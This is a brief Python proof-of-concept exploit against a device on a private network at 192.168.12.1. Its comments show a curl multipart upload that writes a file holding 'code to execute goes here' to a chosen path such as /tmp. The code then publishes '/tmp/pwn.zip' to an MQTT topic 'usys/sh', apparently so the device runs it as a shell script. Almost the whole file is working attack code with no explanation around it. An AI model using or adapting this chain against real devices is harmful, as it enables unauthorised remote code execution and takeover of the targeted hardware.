#!/usr/bin/python

# $ curl -X POST -H "Content-Type: multipart/form-data; boundary=----------------------------4ebf00fbcf09" --data-binary @test.txt http://192.168.12.1:9800
# $ echo > test.txt
# ------------------------------4ebf00fbcf09
# Content-Disposition: form-data; name="file"; filename="/tmp/out.zip"
# 
#
# code to execute goes here 
# ------------------------------4ebf00fbcf09

import sys
import paho.mqtt.client as mqtt

mqttc = mqtt.Client(transport='websockets')   

#mqttc.connect("192.168.123.161", 9801, 60)
#mqttc.connect("192.168.123.161", 80, 60)
#mqttc.connect("192.168.12.1", 9801, 60)
mqttc.connect("192.168.12.1", 80, 60)

mqttc.publish("usys/sh", "/tmp/pwn.zip");


